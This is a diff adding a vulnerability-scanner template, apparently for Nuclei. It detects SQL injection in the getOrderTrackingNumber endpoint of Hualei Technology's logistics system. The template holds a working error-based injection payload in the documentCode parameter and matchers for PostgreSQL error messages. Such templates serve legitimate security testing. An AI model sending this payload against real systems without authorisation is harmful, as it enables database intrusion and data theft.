@@ -1,0 +1,26 @@
+id: hualei-technology-getordertrackingnumber-sqli
+info:
+  name: Hualei Technology Logistics System getOrderTrackingNumber SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Hualei Technology Logistics System contains a SQL injection vulnerability in the getOrderTrackingNumber endpoint.
+http:
+  - method: GET
+    path:
+      - "/getOrderTrackingNumber.htm?documentCode=1'and%0a1=user::integer--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "ERROR: invalid input syntax for integer"
+          - "postgres"
+          - "Error querying database"
+      - type: word
+        words:
+          - "<"
+        negative: true
